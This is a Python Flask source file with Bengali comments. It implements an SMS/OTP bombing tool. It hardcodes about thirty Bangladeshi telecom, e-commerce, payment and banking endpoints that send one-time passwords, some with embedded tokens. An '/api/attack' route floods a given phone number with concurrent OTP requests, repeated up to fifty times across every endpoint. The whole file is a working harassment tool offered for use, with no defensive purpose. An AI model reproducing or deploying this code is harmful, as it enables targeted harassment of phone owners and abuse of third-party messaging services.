from flask import Flask, render_template, request, jsonify
import requests
import concurrent.futures
import json
import os

app = Flask(__name__)

# ============================================================
#  পুরনো API (যা কাজ করতো) + JSON থেকে লোড করা API
# ============================================================

# ১. পুরনো API (হাতে লেখা, কাজ করা)
FIXED_APIS = [
    {"name": "Grameenphone", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "body": '{"msisdn":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Chorki", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "body": '{"number":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Apex", "url": "https://api.apex4u.com/api/auth/login", "method": "POST", "body": '{"phoneNumber":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Bioscope", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "body": '{"number":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Pickaboo", "url": "https://www.pickaboo.com/rest/default/V1/customer-check/exist", "method": "POST", "body": '{"mobile":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Bikroy", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "GET", "params": "phone=*****", "headers": {"content-type": "application/json"}},
    {"name": "Toffee", "url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup", "method": "POST", "body": '{"mobile":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Deeptoplay", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "body": '{"number":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Shajgoj", "url": "https://api.shajgoj.com/api/v2/auth/send-otp", "method": "POST", "body": '{"mobile":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Daraz", "url": "https://www.daraz.com.bd/customer/api/send_otp", "method": "POST", "body": '{"phone":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Foodpanda", "url": "https://api.foodpanda.com.bd/api/v1/login/otp", "method": "POST", "body": '{"phone":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Osudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "body": '{"phoneNumber":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Paperfly", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "POST", "body": '{"phone_number":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Ghoori", "url": "https://api.ghoorilearning.com/api/auth/signup/otp", "method": "POST", "body": '{"mobile_no":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Robi", "url": "https://webapi.robi.com.bd/v1/send-otp", "method": "POST", "body": '{"phone_number":"*****","type":"doorstep"}', "headers": {"content-type": "application/json"}},
    {"name": "Redx", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "body": '{"phoneNumber":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Fundesh", "url": "https://fundesh.com.bd/api/auth/generateOTP", "method": "POST", "body": '{"msisdn":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Jatri", "url": "https://user-api.jslglobal.co:444/v2/send-otp", "method": "POST", "body": '{"phone":"+88*****","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}', "headers": {"content-type": "application/json"}},
    {"name": "Bikash", "url": "https://us-central1-bikash-227008.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "body": '{"country_calling_code":"88","contact_no":"*****","headers":{"PlatForm":"Web"}}', "headers": {"content-type": "application/json"}},
    {"name": "Shikho", "url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "body": '{"mobile":"*****","reason":"LOGIN","vendor":"shikho"}', "headers": {"content-type": "application/json"}},
    {"name": "Ekshop", "url": "https://ekshop.com.bd/v3/api/auth/register-otp", "method": "POST", "body": '{"mobile_number":"*****","type":"customer","token":"473c22b102b7ec9992f0ddb853503460"}', "headers": {"content-type": "application/json"}},
    {"name": "FSIBL", "url": "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", "method": "POST", "body": '{"AccessToken":"","TrackingNo":"","mobileNo":"*****","otpSms":"","product_id":"122","requestChannel":"MOB","trackingStatus":5}', "headers": {"content-type": "application/json"}},
    {"name": "BongoBD", "url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp", "method": "POST", "body": '{"cli":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Moveon", "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "body": '{"phone":"*****","login_type":"signup"}', "headers": {"content-type": "application/json"}},
    {"name": "Pathao", "url": "https://api.pathao.com/api/v1/auth/request-otp", "method": "POST", "body": '{"phone":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Qcoom", "url": "https://auth.qcoom.com/api/v1/otp/send", "method": "POST", "body": '{"mobileNumber":"+88*****"}', "headers": {"content-type": "application/json"}},
    {"name": "Circle", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", "method": "POST", "body": '{"name":"+88*****","email_or_phone":"+88*****","password":"123456lmn","password_confirmation":"123456lmn","register_by":"phone"}', "headers": {"content-type": "application/json"}},
    {"name": "Toybox", "url": "https://api.toybox.com.bd/v1/auth/request-otp", "method": "POST", "body": '{"phone":"*****"}', "headers": {"content-type": "application/json"}},
    {"name": "BKShop", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "method": "POST", "body": '{"phone":"*****","email":"","language":"en"}', "headers": {"content-type": "application/json"}},
    {"name": "MyGP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp", "method": "GET", "params": "mobile=*****&otp_type=REGISTER&user_type=PREPAID", "headers": {"content-type": "application/json"}},
]

# ২. JSON ফাইল থেকে API লোড করা
def load_apis_from_json():
    apis = []
    json_files = ['apibd.json', 'apigp.json', 'apis.json']
    
    for filename in json_files:
        filepath = os.path.join('static', filename)
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if 'apis' in data:
                    for api in data['apis']:
                        if '*****' in str(api):
                            api['name'] = api.get('name', 'Unknown')
                            apis.append(api)
        except Exception as e:
            print(f"Error loading {filename}: {e}")
    
    return apis

# সব API একত্রিত করা
json_apis = load_apis_from_json()

# ডুপ্লিকেট রিমুভ
seen_urls = set()
ALL_APIS = []

for api in FIXED_APIS:
    url = api.get('url', '')
    if url not in seen_urls:
        seen_urls.add(url)
        ALL_APIS.append(api)

for api in json_apis:
    url = api.get('url', '')
    if url not in seen_urls:
        seen_urls.add(url)
        ALL_APIS.append(api)

print(f"[+] Total APIs loaded: {len(ALL_APIS)}")

# ============================================================
#  রিকোয়েস্ট পাঠানোর ফাংশন
# ============================================================
def send_request(api, phone):
    try:
        url = api.get('url', '').replace('*****', phone)
        method = api.get('method', 'POST').upper()
        headers = api.get('headers', {})
        body = api.get('body', '').replace('*****', phone)
        params = api.get('params', '').replace('*****', phone)
        
        if 'content-type' in headers:
            headers['Content-Type'] = headers.pop('content-type')
        
        if method == 'POST':
            if headers.get('Content-Type') == 'application/x-www-form-urlencoded':
                response = requests.post(url, data=body, headers=headers, timeout=10)
            else:
                try:
                    json_body = json.loads(body) if body else {}
                    response = requests.post(url, json=json_body, headers=headers, timeout=10)
                except:
                    response = requests.post(url, data=body, headers=headers, timeout=10)
        else:
            if params:
                url = f"{url}?{params}"
            response = requests.get(url, headers=headers, timeout=10)
        
        return {"success": response.status_code in [200, 201, 202, 204], "status": response.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============================================================
#  Flask রাউট
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    amount = data.get('amount', 1)
    
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    
    if amount > 50:
        amount = 50
    
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_api = {}
        for _ in range(amount):
            for api in ALL_APIS:
                future = executor.submit(send_request, api, phone)
                future_to_api[future] = api
        
        for future in concurrent.futures.as_completed(future_to_api):
            api = future_to_api[future]
            result = future.result()
            result["api_name"] = api.get('name', 'Unknown')
            results.append(result)
    
    success_count = sum(1 for r in results if r.get('success', False))
    total = len(results)
    
    return jsonify({
        "total": total,
        "success": success_count,
        "failed": total - success_count,
        "results": results
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)